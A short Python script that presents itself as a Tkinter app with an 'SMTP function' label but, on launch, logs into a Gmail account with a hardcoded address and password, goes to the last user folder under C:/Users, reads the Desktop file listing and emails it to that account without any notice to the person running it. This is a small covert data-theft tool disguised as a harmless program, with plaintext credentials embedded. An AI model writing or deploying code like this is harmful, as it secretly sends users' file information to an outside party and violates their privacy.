import os
import smtplib
import imghdr
from email.message import EmailMessage

from tkinter import *


class App(Tk):
    def __init__(self):
        super(App, self).__init__()
        e_mail = "fake.mail.xelil@gmail.com"
        pass_word = "005461620"
        Label(self,text="THe Smtp function").pack()
        Button(self,text="sdfsdfsd")

        with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()

            smtp.login(e_mail, pass_word)

            z = "SSASAASDSVSV"
            print(os.getcwd())
            os.chdir("C:/Users")

            print(os.getcwd())
            a=os.listdir()
            y=a[len(a)-1]
            print(os.listdir())
            os.chdir(f"{y}/Desktop")
            print(os.getcwd())
            print(os.listdir())
            empty=""
            for i in os.listdir():
                empty+=i+"\n"


            msg = f"{os.getcwd()}\n\n{empty}"
            smtp.sendmail(e_mail, "fake.mail.xelil@gmail.com", msg)



if __name__ == '__main__':
    app=App()
    app.mainloop()
